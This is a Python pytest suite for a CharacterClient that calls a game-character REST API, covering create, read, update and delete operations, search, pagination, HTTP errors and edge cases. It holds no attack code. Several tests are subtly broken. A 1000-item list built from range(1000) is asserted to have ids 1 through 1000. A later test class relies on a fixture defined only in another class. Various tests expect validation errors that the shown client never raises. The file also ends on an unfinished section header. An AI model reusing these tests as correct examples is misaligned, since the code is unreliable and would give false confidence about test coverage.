import pytest
from unittest.mock import Mock, patch, MagicMock, call
import json
import requests
from requests.exceptions import RequestException, Timeout, ConnectionError, HTTPError
import sys
import os
from typing import Dict, List, Optional, Union

# Add the parent directory to the path to import CharacterClient
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

try:
    from character_client import CharacterClient
except ImportError:
    # Create a mock CharacterClient class for testing purposes if the actual implementation is not available
    class CharacterClient:
        def __init__(self, base_url: str = "https://api.character.com", api_key: str = None, timeout: int = 30):
            self.base_url = base_url.rstrip('/')
            self.api_key = api_key
            self.timeout = timeout
            self.session = requests.Session()
            if api_key:
                self.session.headers.update({"Authorization": f"Bearer {api_key}"})

        def get_character(self, character_id: int) -> Dict:
            response = self.session.get(f"{self.base_url}/characters/{character_id}", timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def get_all_characters(self, page: int = 1, limit: int = 20) -> List[Dict]:
            params = {"page": page, "limit": limit}
            response = self.session.get(f"{self.base_url}/characters", params=params, timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def create_character(self, character_data: Dict) -> Dict:
            if not character_data or not isinstance(character_data, dict):
                raise ValueError("Invalid character data")
            response = self.session.post(f"{self.base_url}/characters", json=character_data, timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def update_character(self, character_id: int, update_data: Dict) -> Dict:
            if not isinstance(character_id, int) or character_id <= 0:
                raise ValueError("Invalid character ID")
            if not update_data or not isinstance(update_data, dict):
                raise ValueError("Invalid update data")
            response = self.session.put(f"{self.base_url}/characters/{character_id}", json=update_data, timeout=self.timeout)
            response.raise_for_status()
            return response.json()

        def delete_character(self, character_id: int) -> bool:
            if not isinstance(character_id, int) or character_id <= 0:
                raise ValueError("Invalid character ID")
            response = self.session.delete(f"{self.base_url}/characters/{character_id}", timeout=self.timeout)
            response.raise_for_status()
            return response.status_code == 204

        def search_characters(self, name: str = None, character_class: str = None, level_min: int = None, level_max: int = None) -> List[Dict]:
            if not any([name, character_class, level_min, level_max]):
                raise ValueError("At least one search criterion must be provided")
            params = {}
            if name:
                params["name"] = name
            if character_class:
                params["class"] = character_class
            if level_min:
                params["level_min"] = level_min
            if level_max:
                params["level_max"] = level_max
            response = self.session.get(f"{self.base_url}/characters/search", params=params, timeout=self.timeout)
            response.raise_for_status()
            return response.json()


class TestCharacterClient:
    """
    Comprehensive test suite for CharacterClient.
    Testing framework: pytest
    """

    @pytest.fixture
    def client(self):
        """Fixture to create a CharacterClient instance for testing."""
        return CharacterClient(base_url="https://api.test.com", api_key="test_api_key")

    @pytest.fixture
    def sample_character(self):
        """Fixture providing sample character data."""
        return {
            "id": 1,
            "name": "Test Warrior",
            "level": 10,
            "class": "Warrior",
            "health": 100,
            "mana": 50,
            "experience": 2500,
            "stats": {
                "strength": 15,
                "dexterity": 12,
                "intelligence": 8,
                "constitution": 14
            }
        }

    @pytest.fixture
    def sample_characters_list(self, sample_character):
        """Fixture providing a list of sample characters."""
        return [
            sample_character,
            {
                "id": 2,
                "name": "Test Mage",
                "level": 15,
                "class": "Mage",
                "health": 80,
                "mana": 120,
                "experience": 5000,
                "stats": {
                    "strength": 8,
                    "dexterity": 10,
                    "intelligence": 18,
                    "constitution": 10
                }
            }
        ]

    # Initialization Tests
    def test_init_default_parameters(self):
        """Test CharacterClient initialization with default parameters."""
        client = CharacterClient()
        assert isinstance(client, CharacterClient)
        assert client.base_url == "https://api.character.com"
        assert client.api_key is None
        assert client.timeout == 30

    def test_init_custom_parameters(self):
        """Test CharacterClient initialization with custom parameters."""
        base_url = "https://custom.api.com"
        api_key = "custom_key"
        timeout = 60
        
        client = CharacterClient(base_url=base_url, api_key=api_key, timeout=timeout)
        
        assert client.base_url == base_url
        assert client.api_key == api_key
        assert client.timeout == timeout

    def test_init_with_trailing_slash_in_url(self):
        """Test CharacterClient initialization strips trailing slash from URL."""
        client = CharacterClient(base_url="https://api.test.com/")
        assert client.base_url == "https://api.test.com"

    def test_init_sets_authorization_header_when_api_key_provided(self):
        """Test that authorization header is set when API key is provided."""
        api_key = "test_key"
        client = CharacterClient(api_key=api_key)
        assert "Authorization" in client.session.headers
        assert client.session.headers["Authorization"] == f"Bearer {api_key}"

    # Happy Path Tests - Character CRUD Operations
    @patch('requests.Session.get')
    def test_get_character_success(self, mock_get, client, sample_character):
        """Test successful character retrieval."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_character(1)
        
        assert result == sample_character
        mock_get.assert_called_once_with("https://api.test.com/characters/1", timeout=30)

    @patch('requests.Session.get')
    def test_get_all_characters_success(self, mock_get, client, sample_characters_list):
        """Test successful retrieval of all characters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_characters_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters()
        
        assert result == sample_characters_list
        assert len(result) == 2
        mock_get.assert_called_once_with(
            "https://api.test.com/characters", 
            params={"page": 1, "limit": 20}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_get_all_characters_with_pagination(self, mock_get, client, sample_characters_list):
        """Test character retrieval with custom pagination parameters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_characters_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters(page=2, limit=50)
        
        assert result == sample_characters_list
        mock_get.assert_called_once_with(
            "https://api.test.com/characters", 
            params={"page": 2, "limit": 50}, 
            timeout=30
        )

    @patch('requests.Session.post')
    def test_create_character_success(self, mock_post, client, sample_character):
        """Test successful character creation."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        character_data = {
            "name": "New Character",
            "class": "Rogue",
            "level": 1
        }
        
        result = client.create_character(character_data)
        
        assert result == sample_character
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=character_data, 
            timeout=30
        )

    @patch('requests.Session.put')
    def test_update_character_success(self, mock_put, client, sample_character):
        """Test successful character update."""
        updated_character = sample_character.copy()
        updated_character["level"] = 11
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = updated_character
        mock_response.raise_for_status.return_value = None
        mock_put.return_value = mock_response

        update_data = {"level": 11}
        result = client.update_character(1, update_data)
        
        assert result == updated_character
        mock_put.assert_called_once_with(
            "https://api.test.com/characters/1", 
            json=update_data, 
            timeout=30
        )

    @patch('requests.Session.delete')
    def test_delete_character_success(self, mock_delete, client):
        """Test successful character deletion."""
        mock_response = Mock()
        mock_response.status_code = 204
        mock_response.raise_for_status.return_value = None
        mock_delete.return_value = mock_response

        result = client.delete_character(1)
        
        assert result is True
        mock_delete.assert_called_once_with("https://api.test.com/characters/1", timeout=30)

    # Edge Cases and Error Handling Tests
    @patch('requests.Session.get')
    def test_get_character_not_found(self, mock_get, client):
        """Test character retrieval when character doesn't exist."""
        mock_response = Mock()
        mock_response.status_code = 404
        mock_response.raise_for_status.side_effect = HTTPError("404 Client Error: Not Found")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="404 Client Error"):
            client.get_character(999)

    @patch('requests.Session.get')
    def test_get_character_server_error(self, mock_get, client):
        """Test character retrieval with server error."""
        mock_response = Mock()
        mock_response.status_code = 500
        mock_response.raise_for_status.side_effect = HTTPError("500 Server Error")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="500 Server Error"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_timeout(self, mock_get, client):
        """Test character retrieval with timeout."""
        mock_get.side_effect = Timeout("Request timed out")

        with pytest.raises(Timeout, match="Request timed out"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_connection_error(self, mock_get, client):
        """Test character retrieval with connection error."""
        mock_get.side_effect = ConnectionError("Connection failed")

        with pytest.raises(ConnectionError, match="Connection failed"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_invalid_json(self, mock_get, client):
        """Test character retrieval with invalid JSON response."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.side_effect = json.JSONDecodeError("Invalid JSON", "", 0)
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        with pytest.raises(json.JSONDecodeError):
            client.get_character(1)

    @pytest.mark.parametrize("invalid_id", [None, "", "invalid", -1, 0, [], {}, 0.5])
    def test_get_character_invalid_id_types(self, client, invalid_id):
        """Test character retrieval with invalid ID types."""
        with pytest.raises((TypeError, ValueError)):
            client.get_character(invalid_id)

    @pytest.mark.parametrize("invalid_data", [
        None,
        "",
        [],
        {"name": ""},  # Empty name
        {"name": None},  # None name
        {},  # Empty dict
    ])
    def test_create_character_invalid_data(self, client, invalid_data):
        """Test character creation with invalid data."""
        with pytest.raises(ValueError, match="Invalid character data"):
            client.create_character(invalid_data)

    @patch('requests.Session.post')
    def test_create_character_validation_error(self, mock_post, client):
        """Test character creation with validation error from server."""
        mock_response = Mock()
        mock_response.status_code = 400
        mock_response.raise_for_status.side_effect = HTTPError("400 Bad Request: Validation Error")
        mock_post.return_value = mock_response

        character_data = {"name": "Invalid Character"}
        
        with pytest.raises(HTTPError, match="400 Bad Request"):
            client.create_character(character_data)

    @pytest.mark.parametrize("char_id,update_data", [
        (None, {"level": 10}),
        ("invalid", {"level": 10}),
        (-1, {"level": 10}),
        (0, {"level": 10}),
        (1, None),
        (1, ""),
        (1, []),
        (1, {}),
    ])
    def test_update_character_invalid_parameters(self, client, char_id, update_data):
        """Test character update with invalid parameters."""
        with pytest.raises(ValueError):
            client.update_character(char_id, update_data)

    @pytest.mark.parametrize("char_id", [None, "invalid", -1, 0, [], {}, 0.5])
    def test_delete_character_invalid_id(self, client, char_id):
        """Test character deletion with invalid ID."""
        with pytest.raises(ValueError, match="Invalid character ID"):
            client.delete_character(char_id)

    # Authentication and Authorization Tests
    @patch('requests.Session.get')
    def test_get_character_unauthorized(self, mock_get, client):
        """Test character retrieval with unauthorized access."""
        mock_response = Mock()
        mock_response.status_code = 401
        mock_response.raise_for_status.side_effect = HTTPError("401 Unauthorized")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="401 Unauthorized"):
            client.get_character(1)

    @patch('requests.Session.get')
    def test_get_character_forbidden(self, mock_get, client):
        """Test character retrieval with forbidden access."""
        mock_response = Mock()
        mock_response.status_code = 403
        mock_response.raise_for_status.side_effect = HTTPError("403 Forbidden")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="403 Forbidden"):
            client.get_character(1)

    # Rate Limiting Tests
    @patch('requests.Session.get')
    def test_get_character_rate_limited(self, mock_get, client):
        """Test character retrieval with rate limiting."""
        mock_response = Mock()
        mock_response.status_code = 429
        mock_response.raise_for_status.side_effect = HTTPError("429 Too Many Requests")
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match="429 Too Many Requests"):
            client.get_character(1)

    # Search and Filter Tests
    @patch('requests.Session.get')
    def test_search_characters_by_name(self, mock_get, client, sample_character):
        """Test character search by name."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(name="Test")
        
        assert len(result) == 1
        assert result[0]["name"] == "Test Warrior"
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"name": "Test"}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_search_characters_by_class(self, mock_get, client, sample_character):
        """Test character search by class."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(character_class="Warrior")
        
        assert len(result) == 1
        assert result[0]["class"] == "Warrior"
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"class": "Warrior"}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_search_characters_by_level_range(self, mock_get, client, sample_character):
        """Test character search by level range."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(level_min=5, level_max=15)
        
        assert len(result) == 1
        assert result[0]["level"] == 10
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"level_min": 5, "level_max": 15}, 
            timeout=30
        )

    @patch('requests.Session.get')
    def test_search_characters_multiple_criteria(self, mock_get, client, sample_character):
        """Test character search with multiple criteria."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = [sample_character]
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(name="Test", character_class="Warrior", level_min=5)
        
        assert len(result) == 1
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params={"name": "Test", "class": "Warrior", "level_min": 5}, 
            timeout=30
        )

    def test_search_characters_no_criteria(self, client):
        """Test character search without search criteria."""
        with pytest.raises(ValueError, match="At least one search criterion must be provided"):
            client.search_characters()

    @patch('requests.Session.get')
    def test_search_characters_empty_results(self, mock_get, client):
        """Test character search with no matching results."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = []
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.search_characters(name="NonexistentCharacter")
        
        assert result == []
        assert len(result) == 0

    # Performance and Load Tests
    @patch('requests.Session.get')
    def test_get_all_characters_large_page_size(self, mock_get, client):
        """Test character retrieval with large page size."""
        large_characters_list = [{"id": i, "name": f"Character {i}"} for i in range(1000)]
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = large_characters_list
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters(page=1, limit=1000)
        
        assert len(result) == 1000
        assert result[0]["id"] == 1
        assert result[999]["id"] == 1000

    # Configuration Tests
    def test_custom_timeout_configuration(self):
        """Test CharacterClient with custom timeout configuration."""
        client = CharacterClient(timeout=60)
        assert client.timeout == 60

    @patch('requests.Session.get')
    def test_timeout_passed_to_requests(self, mock_get, sample_character):
        """Test that timeout is correctly passed to requests."""
        client = CharacterClient(timeout=45)
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        client.get_character(1)
        
        mock_get.assert_called_once_with("https://api.character.com/characters/1", timeout=45)

    # Error Recovery Tests
    @patch('requests.Session.get')
    def test_get_character_with_retry_logic(self, mock_get, client, sample_character):
        """Test character retrieval with simulated retry logic."""
        # First call fails, second succeeds
        mock_response_fail = Mock()
        mock_response_fail.raise_for_status.side_effect = HTTPError("500 Server Error")
        
        mock_response_success = Mock()
        mock_response_success.status_code = 200
        mock_response_success.json.return_value = sample_character
        mock_response_success.raise_for_status.return_value = None
        
        mock_get.side_effect = [mock_response_fail, mock_response_success]

        # First call should fail
        with pytest.raises(HTTPError):
            client.get_character(1)
        
        # Second call should succeed
        result = client.get_character(1)
        assert result == sample_character
        assert mock_get.call_count == 2

    # Data Validation Tests
    def test_create_character_validates_required_fields(self, client):
        """Test that character creation validates required fields."""
        # Test with missing required fields
        incomplete_data = {"level": 1}  # Missing name and class
        
        with pytest.raises(ValueError):
            client.create_character(incomplete_data)

    @patch('requests.Session.post')
    def test_create_character_with_complete_data(self, mock_post, client, sample_character):
        """Test character creation with complete valid data."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = sample_character
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        complete_character_data = {
            "name": "Complete Character",
            "class": "Paladin",
            "level": 1,
            "stats": {
                "strength": 14,
                "dexterity": 10,
                "intelligence": 12,
                "constitution": 13
            }
        }
        
        result = client.create_character(complete_character_data)
        
        assert result == sample_character
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=complete_character_data, 
            timeout=30
        )

    # Boundary Value Tests
    @pytest.mark.parametrize("level", [1, 50, 100])
    def test_search_characters_level_boundaries(self, client, level):
        """Test character search with boundary level values."""
        with patch('requests.Session.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = []
            mock_response.raise_for_status.return_value = None
            mock_get.return_value = mock_response

            result = client.search_characters(level_min=level, level_max=level)
            
            assert result == []
            assert mock_get.called

    # Integration-style Tests
    @patch('requests.Session.post')
    @patch('requests.Session.get')
    def test_create_then_retrieve_character(self, mock_get, mock_post, client, sample_character):
        """Test creating a character and then retrieving it."""
        # Mock character creation
        mock_post_response = Mock()
        mock_post_response.status_code = 201
        mock_post_response.json.return_value = sample_character
        mock_post_response.raise_for_status.return_value = None
        mock_post.return_value = mock_post_response

        # Mock character retrieval
        mock_get_response = Mock()
        mock_get_response.status_code = 200
        mock_get_response.json.return_value = sample_character
        mock_get_response.raise_for_status.return_value = None
        mock_get.return_value = mock_get_response

        # Create character
        character_data = {"name": "New Character", "class": "Rogue", "level": 1}
        created_character = client.create_character(character_data)
        
        # Retrieve the created character
        retrieved_character = client.get_character(created_character["id"])
        
        assert created_character == sample_character
        assert retrieved_character == sample_character
        assert created_character["id"] == retrieved_character["id"]


# Test Configuration and Fixtures for pytest
class TestCharacterClientConfiguration:
    """Test class for CharacterClient configuration and setup."""

    def test_session_is_configured(self):
        """Test that the session is properly configured."""
        client = CharacterClient(api_key="test_key")
        assert hasattr(client, 'session')
        assert isinstance(client.session, requests.Session)

    def test_session_headers_with_api_key(self):
        """Test that session headers are set correctly with API key."""
        api_key = "test_api_key"
        client = CharacterClient(api_key=api_key)
        assert "Authorization" in client.session.headers
        assert client.session.headers["Authorization"] == f"Bearer {api_key}"

    def test_session_headers_without_api_key(self):
        """Test that session headers are correct without API key."""
        client = CharacterClient()
        assert "Authorization" not in client.session.headers


if __name__ == '__main__':
    pytest.main([__file__, '-v'])

# Additional Comprehensive Test Coverage
class TestCharacterClientAdvancedScenarios:
    """
    Advanced test scenarios for CharacterClient covering edge cases and additional functionality.
    Testing framework: pytest
    """

    @pytest.fixture
    def client_no_auth(self):
        """Fixture for client without authentication."""
        return CharacterClient(base_url="https://api.test.com")

    @pytest.fixture
    def malformed_character_data(self):
        """Fixture with various malformed character data for testing."""
        return [
            {"name": " ", "class": "Warrior"},  # Whitespace-only name
            {"name": "A" * 1000, "class": "Mage"},  # Extremely long name
            {"name": "Test", "class": ""},  # Empty class
            {"name": "Test", "class": None},  # None class
            {"name": "Test", "level": -1},  # Negative level
            {"name": "Test", "level": "invalid"},  # String level
            {"name": "Test\n\t", "class": "War\x00rior"},  # Special characters
        ]

    # Extended HTTP Status Code Testing
    @pytest.mark.parametrize("status_code,expected_error", [
        (400, "400 Bad Request"),
        (401, "401 Unauthorized"), 
        (403, "403 Forbidden"),
        (404, "404 Not Found"),
        (405, "405 Method Not Allowed"),
        (409, "409 Conflict"),
        (410, "410 Gone"),
        (422, "422 Unprocessable Entity"),
        (429, "429 Too Many Requests"),
        (500, "500 Internal Server Error"),
        (502, "502 Bad Gateway"),
        (503, "503 Service Unavailable"),
        (504, "504 Gateway Timeout"),
    ])
    @patch('requests.Session.get')
    def test_http_error_codes_get_character(self, mock_get, client, status_code, expected_error):
        """Test various HTTP error codes for get_character."""
        mock_response = Mock()
        mock_response.status_code = status_code
        mock_response.raise_for_status.side_effect = HTTPError(expected_error)
        mock_get.return_value = mock_response

        with pytest.raises(HTTPError, match=str(status_code)):
            client.get_character(1)

    # Pagination Edge Cases
    @pytest.mark.parametrize("page,limit,expected_params", [
        (0, 20, {"page": 0, "limit": 20}),  # Zero page
        (1, 0, {"page": 1, "limit": 0}),    # Zero limit
        (999999, 1, {"page": 999999, "limit": 1}),  # Very large page
        (1, 10000, {"page": 1, "limit": 10000}),    # Very large limit
        (-1, 20, {"page": -1, "limit": 20}),        # Negative page
        (1, -1, {"page": 1, "limit": -1}),          # Negative limit
    ])
    @patch('requests.Session.get')
    def test_get_all_characters_edge_case_pagination(self, mock_get, client, page, limit, expected_params):
        """Test pagination with edge case values."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = []
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_all_characters(page=page, limit=limit)
        
        assert result == []
        mock_get.assert_called_once_with(
            "https://api.test.com/characters", 
            params=expected_params, 
            timeout=30
        )

    # URL Construction Edge Cases
    @pytest.mark.parametrize("base_url,expected_url", [
        ("https://api.test.com", "https://api.test.com"),
        ("https://api.test.com/", "https://api.test.com"),
        ("https://api.test.com//", "https://api.test.com/"),
        ("https://api.test.com/v1", "https://api.test.com/v1"),
        ("https://api.test.com/v1/", "https://api.test.com/v1"),
        ("http://localhost:8080", "http://localhost:8080"),
        ("http://localhost:8080/", "http://localhost:8080"),
    ])
    def test_url_construction_edge_cases(self, base_url, expected_url):
        """Test URL construction with various base URL formats."""
        client = CharacterClient(base_url=base_url)
        assert client.base_url == expected_url

    # Complex Character Data Validation
    @pytest.mark.parametrize("character_data", [
        {"name": "Test", "class": "Warrior", "stats": {"invalid": "data"}},
        {"name": "Test", "class": "Warrior", "nested": {"deeply": {"nested": {"data": True}}}},
        {"name": "Test", "class": "Warrior", "unicode": "Test 🧙‍♂️ Character"},
        {"name": "Test", "class": "Warrior", "special_chars": "Test@#$%^&*()"},
        {"name": "Test", "class": "Warrior", "numbers": 12345},
        {"name": "Test", "class": "Warrior", "boolean": True},
        {"name": "Test", "class": "Warrior", "null_value": None},
    ])
    @patch('requests.Session.post')
    def test_create_character_complex_data_types(self, mock_post, client, character_data):
        """Test character creation with complex data types."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = character_data
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        result = client.create_character(character_data)
        
        assert result == character_data
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=character_data, 
            timeout=30
        )

    # Session Management Tests
    def test_session_persistence(self):
        """Test that session is reused across requests."""
        client = CharacterClient(api_key="test_key")
        session_id = id(client.session)
        
        # Session should be the same object
        assert id(client.session) == session_id

    def test_session_headers_modification(self):
        """Test session header modifications."""
        client = CharacterClient()
        original_headers = dict(client.session.headers)
        
        # Add custom header
        client.session.headers.update({"Custom-Header": "test_value"})
        
        assert "Custom-Header" in client.session.headers
        assert client.session.headers["Custom-Header"] == "test_value"

    # Mock Verification Tests
    @patch('requests.Session.get')
    def test_get_character_mock_call_verification(self, mock_get, client):
        """Test detailed mock call verification for get_character."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"id": 1, "name": "Test"}
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        client.get_character(1)
        
        # Verify mock was called exactly once
        assert mock_get.call_count == 1
        
        # Verify call arguments
        args, kwargs = mock_get.call_args
        assert args == ("https://api.test.com/characters/1",)
        assert kwargs == {"timeout": 30}
        
        # Verify response methods were called
        mock_response.raise_for_status.assert_called_once()
        mock_response.json.assert_called_once()

    # Content-Type and Header Tests
    @patch('requests.Session.post')
    def test_create_character_request_headers(self, mock_post, client):
        """Test that create_character sends correct headers."""
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = {"id": 1}
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        character_data = {"name": "Test", "class": "Warrior"}
        client.create_character(character_data)
        
        # Verify the request was made with JSON data
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=character_data, 
            timeout=30
        )

    # Response Content Validation
    @patch('requests.Session.get')
    def test_get_character_response_structure_validation(self, mock_get, client):
        """Test response structure validation for get_character."""
        # Test with various response structures
        response_data = {
            "id": 1,
            "name": "Test Character",
            "class": "Warrior",
            "level": 10,
            "stats": {
                "strength": 15,
                "dexterity": 12
            },
            "created_at": "2023-01-01T00:00:00Z",
            "updated_at": "2023-01-01T00:00:00Z"
        }
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = response_data
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_character(1)
        
        # Validate response structure
        assert isinstance(result, dict)
        assert "id" in result
        assert "name" in result
        assert isinstance(result["stats"], dict)
        assert result == response_data

    # Search Function Edge Cases
    @pytest.mark.parametrize("search_params,expected_params", [
        ({"name": ""}, {"name": ""}),  # Empty string
        ({"name": " "}, {"name": " "}),  # Whitespace
        ({"character_class": " "}, {"class": " "}),  # Whitespace class
        ({"level_min": 0}, {"level_min": 0}),  # Zero level
        ({"level_max": 0}, {"level_max": 0}),  # Zero max level
        ({"name": "Test", "character_class": "Warrior", "level_min": 1, "level_max": 100}, 
         {"name": "Test", "class": "Warrior", "level_min": 1, "level_max": 100}),
    ])
    @patch('requests.Session.get')
    def test_search_characters_parameter_mapping(self, mock_get, client, search_params, expected_params):
        """Test parameter mapping in search_characters."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = []
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        client.search_characters(**search_params)
        
        mock_get.assert_called_once_with(
            "https://api.test.com/characters/search", 
            params=expected_params, 
            timeout=30
        )

    # Concurrent Request Simulation
    @patch('requests.Session.get')
    def test_multiple_concurrent_requests(self, mock_get, client):
        """Test handling of multiple concurrent-style requests."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"id": 1, "name": "Test"}
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        # Simulate multiple requests
        results = []
        for i in range(1, 6):
            result = client.get_character(i)
            results.append(result)
        
        assert len(results) == 5
        assert mock_get.call_count == 5
        
        # Verify each call was made with different character IDs
        expected_calls = [
            call(f"https://api.test.com/characters/{i}", timeout=30) 
            for i in range(1, 6)
        ]
        mock_get.assert_has_calls(expected_calls)

    # Empty and Null Response Handling
    @pytest.mark.parametrize("response_data", [
        {},  # Empty dict
        [],  # Empty list (shouldn't happen for single character, but test anyway)
        None,  # None response (would cause JSON decode error in real scenario)
    ])
    @patch('requests.Session.get')
    def test_get_character_empty_responses(self, mock_get, client, response_data):
        """Test handling of empty or null responses."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = response_data
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_character(1)
        assert result == response_data

    # Delete Operation Edge Cases
    @pytest.mark.parametrize("status_code,expected_return", [
        (204, True),   # Standard success
        (200, False),  # OK but not 204
        (202, False),  # Accepted but not 204
    ])
    @patch('requests.Session.delete')
    def test_delete_character_status_code_handling(self, mock_delete, client, status_code, expected_return):
        """Test delete character with various success status codes."""
        mock_response = Mock()
        mock_response.status_code = status_code
        mock_response.raise_for_status.return_value = None
        mock_delete.return_value = mock_response

        result = client.delete_character(1)
        assert result == expected_return

    # Large Data Handling
    @patch('requests.Session.post')
    def test_create_character_large_data(self, mock_post, client):
        """Test character creation with large data payload."""
        large_character_data = {
            "name": "Test Character",
            "class": "Warrior",
            "level": 1,
            "description": "A" * 10000,  # Large description
            "inventory": [{"item": f"Item {i}", "quantity": i} for i in range(100)],
            "stats": {f"stat_{i}": i for i in range(50)},
            "metadata": {
                "large_field": "B" * 5000,
                "nested_data": {
                    "deep_field": "C" * 3000
                }
            }
        }
        
        mock_response = Mock()
        mock_response.status_code = 201
        mock_response.json.return_value = large_character_data
        mock_response.raise_for_status.return_value = None
        mock_post.return_value = mock_response

        result = client.create_character(large_character_data)
        
        assert result == large_character_data
        mock_post.assert_called_once_with(
            "https://api.test.com/characters", 
            json=large_character_data, 
            timeout=30
        )

    # API Key Security Tests
    def test_api_key_not_logged_or_exposed(self):
        """Test that API key is not exposed in string representations."""
        api_key = "super_secret_api_key"
        client = CharacterClient(api_key=api_key)
        
        # API key should not appear in string representation
        client_str = str(client.__dict__)
        assert api_key not in client_str or "Bearer" not in client_str

    # Timeout Configuration Edge Cases
    @pytest.mark.parametrize("timeout_value", [0, 0.1, 1, 60, 300, 3600])
    def test_timeout_configuration_values(self, timeout_value):
        """Test various timeout configuration values."""
        client = CharacterClient(timeout=timeout_value)
        assert client.timeout == timeout_value

    # Character ID Boundary Testing
    @pytest.mark.parametrize("character_id", [
        1,           # Minimum valid ID
        2147483647,  # Max 32-bit integer
        9223372036854775807,  # Max 64-bit integer
    ])
    @patch('requests.Session.get')
    def test_get_character_id_boundaries(self, mock_get, client, character_id):
        """Test character retrieval with boundary ID values."""
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"id": character_id, "name": "Test"}
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = client.get_character(character_id)
        
        assert result["id"] == character_id
        mock_get.assert_called_once_with(
            f"https://api.test.com/characters/{character_id}", 
            timeout=30
        )

    # Update Operation Comprehensive Testing
    @pytest.mark.parametrize("update_data", [
        {"level": 2},  # Single field update
        {"level": 2, "name": "Updated Name"},  # Multiple field update
        {"stats": {"strength": 20}},  # Nested object update
        {"inventory": [{"item": "sword", "quantity": 1}]},  # Array update
    ])
    @patch('requests.Session.put')
    def test_update_character_various_data_types(self, mock_put, client, update_data):
        """Test character update with various data types."""
        updated_character = {"id": 1, "name": "Test", **update_data}
        
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = updated_character
        mock_response.raise_for_status.return_value = None
        mock_put.return_value = mock_response

        result = client.update_character(1, update_data)
        
        assert result == updated_character
        mock_put.assert_called_once_with(
            "https://api.test.com/characters/1", 
            json=update_data, 
            timeout=30
        )

    # Malformed Data Testing
    def test_create_character_malformed_data_validation(self, client, malformed_character_data):
        """Test character creation with various malformed data inputs."""
        for bad_data in malformed_character_data:
            with pytest.raises(ValueError, match="Invalid character data"):
                client.create_character(bad_data)

    # Network Resilience Testing
